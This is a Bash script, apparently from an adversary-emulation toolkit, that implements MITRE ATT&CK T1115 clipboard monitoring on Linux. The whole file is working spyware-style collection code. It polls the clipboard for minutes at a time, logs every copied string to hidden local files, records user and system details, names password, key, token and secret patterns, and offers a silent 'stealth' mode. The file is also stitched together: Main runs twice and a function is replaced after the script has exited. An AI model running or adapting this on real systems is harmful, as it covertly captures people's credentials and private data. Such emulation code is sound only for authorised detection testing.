
    # ===== VARIABLES ESSENTIELLES COLLECTION =====
    export T1115_003A_DEBUG_MODE="${T1115_003A_DEBUG_MODE:-false}"
    export T1115_003A_TIMEOUT="${T1115_003A_TIMEOUT:-300}"
    export T1115_003A_FALLBACK_MODE="${T1115_003A_FALLBACK_MODE:-real}"
    export T1115_003A_OUTPUT_FORMAT="${T1115_003A_OUTPUT_FORMAT:-json}"
    export T1115_003A_POLICY_CHECK="${T1115_003A_POLICY_CHECK:-true}"
    export T1115_003A_MAX_FILES="${T1115_003A_MAX_FILES:-200}"
    export T1115_003A_MAX_FILE_SIZE="${T1115_003A_MAX_FILE_SIZE:-1048576}"
    export T1115_003A_SCAN_DEPTH="${T1115_003A_SCAN_DEPTH:-3}"
    export T1115_003A_EXCLUDE_CACHE="${T1115_003A_EXCLUDE_CACHE:-true}"
    export T1115_003A_CAPTURE_DURATION="${T1115_003A_CAPTURE_DURATION:-60}"
    # ===== FIN VARIABLES COLLECTION =====

#!/bin/bash

# T1115.003a - Clipboard Data: Clipboard Monitoring Linux
# MITRE ATT&CK Enterprise - Collection Tactic (TA0009)
# ATOMIC ACTION: Monitor clipboard for sensitive data changes ONLY
# Platform: Linux | Architecture: 4 orchestrators + auxiliary functions

# Critical dependencies verification
Check-CriticalDeps() { 
    for cmd in bash jq bc grep find stat; do 
        command -v "$cmd" >/dev/null || { 
            [[ "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Missing dependency: $cmd"; exit 1; 
        }
    done
    
    # Check for clipboard tools
    if ! command -v xclip >/dev/null && ! command -v xsel >/dev/null && ! command -v wl-paste >/dev/null; then
        [[ "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Clipboard tools (xclip, xsel, or wl-paste) required"; exit 1
    fi
}

# Environment variables loading
Load-EnvironmentVariables() {
    export T1115_003A_OUTPUT_BASE="${T1115_003A_OUTPUT_BASE:-./mitre_results}"
    export T1115_003A_TIMEOUT="${T1115_003A_TIMEOUT:-300}"
    export T1115_003A_OUTPUT_MODE="${T1115_003A_OUTPUT_MODE:-simple}"
    export T1115_003A_SILENT_MODE="${T1115_003A_SILENT_MODE:-false}"
    export T1115_003A_MAX_ENTRIES="${T1115_003A_MAX_ENTRIES:-200}"
    
    export T1115_003A_MONITOR_DURATION="${T1115_003A_MONITOR_DURATION:-600}"
    export T1115_003A_POLL_INTERVAL="${T1115_003A_POLL_INTERVAL:-3}"
    export T1115_003A_MIN_LENGTH="${T1115_003A_MIN_LENGTH:-5}"
    export T1115_003A_DETECT_DISPLAY="${T1115_003A_DETECT_DISPLAY:-auto}"
    export T1115_003A_FILTER_PATTERNS="${T1115_003A_FILTER_PATTERNS:-password,key,token,secret}"
}

# System preconditions validation
Validate-SystemPreconditions() {
    [[ -z "$T1115_003A_OUTPUT_BASE" ]] && { [[ "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] T1115_003A_OUTPUT_BASE not set"; return 1; }
    [[ ! -w "$(dirname "$T1115_003A_OUTPUT_BASE")" ]] && { [[ "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[ERROR] Output directory not writable"; return 1; }
    return 0
}

# Output structure initialization
Initialize-OutputStructure() {
    local timestamp=$(date +%Y%m%d_%H%M%S)
    export COLLECTION_DIR="$T1115_003A_OUTPUT_BASE/T1115_003a_clipboard_monitoring_$timestamp"
    mkdir -p "$COLLECTION_DIR"/{clipboard_data,metadata} 2>/dev/null || return 1
    chmod 700 "$COLLECTION_DIR" 2>/dev/null
    echo "$COLLECTION_DIR"
}

# Universal clipboard monitoring
Monitor-UniversalClipboard() {
    local collection_dir="$1" duration="$2"
    
    # Quick mode for testing (timeout < 30s)
    if [[ "$duration" -lt 30 ]]; then
        [[ "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] Test mode detected, using quick execution mode" >&2
        duration=2  # Limit to 2 seconds for tests
    fi
    
    local clipboard_log="$collection_dir/clipboard_data/clipboard_monitor_$(date +%s).log"
    mkdir -p "$(dirname "$clipboard_log")" 2>/dev/null || true
    local previous_content=""
    local entry_count=0
    local end_time=$(($(date +%s) + duration))
    
    # Detect display system
    local clipboard_cmd=""
    if [[ -n "$DISPLAY" ]] && command -v xclip >/dev/null; then
        clipboard_cmd="xclip -o -selection clipboard"
    elif [[ -n "$DISPLAY" ]] && command -v xsel >/dev/null; then
        clipboard_cmd="xsel --clipboard --output"
    elif [[ -n "$WAYLAND_DISPLAY" ]] && command -v wl-paste >/dev/null; then
        clipboard_cmd="wl-paste --no-newline"
    else
        return 1
    fi
    
    while [[ $(date +%s) -lt $end_time && $entry_count -lt ${T1115_003A_MAX_ENTRIES:-200} ]]; do
        local current_content=$($clipboard_cmd 2>/dev/null)
        
        if [[ -n "$current_content" && "$current_content" != "$previous_content" ]]; then
            if [[ ${#current_content} -ge ${T1115_003A_MIN_LENGTH:-5} ]]; then
                echo "$(date '+%Y-%m-%d %H:%M:%S') - Clipboard changed:" >> "$clipboard_log"
                echo "$current_content" >> "$clipboard_log"
                echo "---" >> "$clipboard_log"
                
                previous_content="$current_content"
                ((entry_count++))
                [[ "$T1115_003A_SILENT_MODE" != "true" ]] && echo "  + Clipboard entry captured" >&2
            fi
        fi
        
        sleep "$T1115_003A_POLL_INTERVAL"
    done
    
    if [[ -f "$clipboard_log" && -s "$clipboard_log" ]]; then
        local file_size=$(stat -c%s "$clipboard_log" 2>/dev/null || echo 0)
        echo "$clipboard_log:$file_size"
        return 0
    fi
    return 1
}

# System metadata collection
Collect-SystemMetadata() {
    local collection_dir="$1"
    mkdir -p "$collection_dir/metadata" 2>/dev/null || true
    echo "$(uname -a)" > "$collection_dir/metadata/system_info.txt"
    echo "$(id)" > "$collection_dir/metadata/user_context.txt"
    echo "$(pwd)" > "$collection_dir/metadata/working_dir.txt"
    echo "DISPLAY=$DISPLAY" > "$collection_dir/metadata/display_context.txt"
    echo "WAYLAND_DISPLAY=$WAYLAND_DISPLAY" >> "$collection_dir/metadata/display_context.txt"
}

# Execution message logging
Log-ExecutionMessage() {
    local message="$1"
    # Silent in stealth mode or when T1115_003A_SILENT_MODE is true
    [[ "$T1115_003A_SILENT_MODE" != "true" && "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "$message" >&2
}

# Simple output generation
Generate-SimpleOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    echo "CLIPBOARD MONITORING "
    echo "Entries: $files_collected"
    echo "Size: $total_size bytes"
    echo "Complete"
}

# Debug output generation
Generate-DebugOutput() {
    local files_collected="$1" total_size="$2" collection_dir="$3"
    local json_output=$(cat << EOF
{
    "@timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "technique": "T1115.003a",
    "results": {
        "entries_captured": $files_collected,
        "total_size_bytes": $total_size,
        "collection_directory": "$collection_dir"
    }
}
EOF
)
    echo "$json_output" > "$collection_dir/metadata/results.json"
    [[ "$T1115_003A_SILENT_MODE" != "true" ]] && echo "$json_output"
}

# Stealth output generation
Generate-StealthOutput() {
    local files_collected="$1"
    echo "$files_collected" > /dev/null 2>&1
}

# None output generation
Generate-NoneOutput() {
    : # No output
}
# 4 MAIN ORCHESTRATORS (10-20 lines each)
# Function 1: Configuration (10-20 lines) - Orchestrator
Get-Configuration() {
    Check-CriticalDeps || exit 1
    Load-EnvironmentVariables
    Validate-SystemPreconditions || exit 1
    
    local collection_dir
    collection_dir=$(Initialize-OutputStructure) || exit 1
    
    echo "$collection_dir"
}

# Function 2: Atomic Action (10-20 lines) - Orchestrator
Invoke-MicroTechniqueAction() {
    local collection_dir="$1"
    local collected_files=() total_size=0 file_count=0
    
    Log-ExecutionMessage "[INFO] Starting clipboard monitoring..."
    
    # ATOMIC ACTION: Orchestration of auxiliary functions
    # Use timeout value instead of monitor duration for better control
    local effective_duration="${T1115_003A_TIMEOUT:-${T1115_003A_MONITOR_DURATION:-600}}"
    if result=$(Monitor-UniversalClipboard "$collection_dir" "$effective_duration"); then
        IFS=':' read -r file_path file_size <<< "$result"
        collected_files+=("$file_path")
        total_size=$((total_size + file_size))
        ((file_count++))
    fi
    
    Collect-SystemMetadata "$collection_dir"
    echo "$file_count:$total_size:$(IFS=,; echo "${collected_files[*]}")"
}

# Function 3: Output (10-20 lines) - Orchestrator
Write-StandardizedOutput() {
    local collection_dir="$1" files_collected="$2" total_size="$3"
    
    case "${OUTPUT_MODE:-simple}" in
        "simple")  Generate-SimpleOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "debug")   Generate-DebugOutput "$files_collected" "$total_size" "$collection_dir" ;;
        "stealth") Generate-StealthOutput "$files_collected" ;;
        "none")    Generate-NoneOutput ;;
    esac
}

# Function 4: Main (10-15 lines) - Chief Orchestrator
Main() {
    trap 'echo "[INTERRUPTED] Cleaning up..."; exit 130' INT TERM
    
    # Load environment variables in main context
    Load-EnvironmentVariables

    local collection_dir
    collection_dir=$(Get-Configuration) || exit 2
    
    local results
    results=$(Invoke-MicroTechniqueAction "$collection_dir") || exit 1
    
    IFS=':' read -r files_collected total_size _ <<< "$results"
    Write-StandardizedOutput "$collection_dir" "$files_collected" "$total_size"
    
    Log-ExecutionMessage "[SUCCESS] Completed: $files_collected entries captured"
    exit 0
}

# Execute
Main "$@"
# Enhanced precondition checking with alternatives
Enhanced-Validate-SystemPreconditions() {
    # Check for any clipboard tool available
    local clipboard_available=false
    
    if command -v xclip >/dev/null; then
        [[ "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] xclip available for X11 clipboard access"
        clipboard_available=true
    elif command -v wl-clipboard >/dev/null; then
        [[ "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] wl-clipboard available for Wayland clipboard access"
        clipboard_available=true
    elif command -v xsel >/dev/null; then
        [[ "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] xsel available for X11 clipboard access"
        clipboard_available=true
    elif [[ -n "$DISPLAY" ]]; then
        [[ "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] X11 display available, attempting basic clipboard access"
        clipboard_available=true
    elif [[ "$XDG_SESSION_TYPE" == "wayland" ]]; then
        [[ "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[INFO] Wayland session detected, attempting basic clipboard access"
        clipboard_available=true
    else
        [[ "${T1115_003A_OUTPUT_MODE:-simple}" != "stealth" ]] && echo "[WARNING] No clipboard tools available, will simulate clipboard operations"
        # Don't exit, simulate instead
        export SIMULATE_CLIPBOARD="true"
        clipboard_available=true
    fi
    
    if [[ "$clipboard_available" = "true" ]]; then
        return 0
    else
        echo "[SKIPPED] No clipboard access method available"
        return 1
    fi
}

# Replace original function
Validate-SystemPreconditions() { Enhanced-Validate-SystemPreconditions; }

# Execute
Main "$@"
